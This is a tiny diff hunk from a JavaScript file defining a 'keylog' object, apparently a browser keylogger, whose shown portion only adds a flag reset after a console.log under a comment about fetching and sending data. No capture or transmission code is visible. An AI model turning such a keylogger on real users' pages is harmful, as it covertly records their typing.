@@ -31,6 +31,7 @@ var keylog = {
 
     // (C3) FECTH SEND
     console.log(data);
+    keylog.sending = false;
   }}
 };
 window.addEventListener("DOMContentLoaded", keylog.init);
